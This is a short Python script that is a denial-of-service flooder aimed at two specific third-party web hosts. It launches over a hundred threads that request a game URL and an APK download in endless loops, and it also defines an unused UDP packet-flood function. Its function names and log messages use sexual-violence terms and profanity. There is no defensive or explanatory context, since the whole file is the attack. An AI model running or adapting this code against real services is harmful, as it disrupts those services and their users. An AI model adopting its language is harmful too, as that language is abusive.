from urllib import request
import _thread
import time
import socket
import random


bytes = random._urandom(1490)

dns_url='https://g.51wcity.com/game/random/de1863eeacbb42a2a3e9c2d4a10b034e'
dld_url='https://res.52ywan.com/androidpack/2122-178-130736-14006.apk'

x=0


def rapist(url, no):
    i=0
    while True:
        try:
            req = request.urlopen(url, timeout=5)
        except socket.timeout:
            i+=1
            print('$',no,'#',i,'choo choo motherfucker')
        except Exception as e:
            print(e)
            print('rapist No.'+no.__str__()+' wanna do it again.')
            
        
def gangbang(url, no):
    i=0
    while True:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.sendto(bytes, (url,8080))
        except Exception as e:
            #print(e)
            print('rapist No.'+no.__str__()+' wanna do it again.')
            time.sleep(15)
            continue

        print('$',no,'#',i,'choo choo motherfucker')

def femdom(url, no):
    
    global x
    
    i=0
    while True:
        try:
            req = request.urlopen(url)
            i+=1
            x+=1
        except Exception as e:
            print(e)
            print('rapist No.'+no.__str__()+' wanna do it again.')
            time.sleep(15)
            continue
        print('$',no,'#',i,'choo choo motherfucker')


_thread.start_new_thread(femdom, (dld_url,-1))
for i in range(0,101):
    print('starting rapist...',i)
    _thread.start_new_thread(femdom, (dns_url,i))

f=open('log.txt','w')
while True:
    print('$hack$',x)
    f.writelines(x.__str__())
    time.sleep(5)
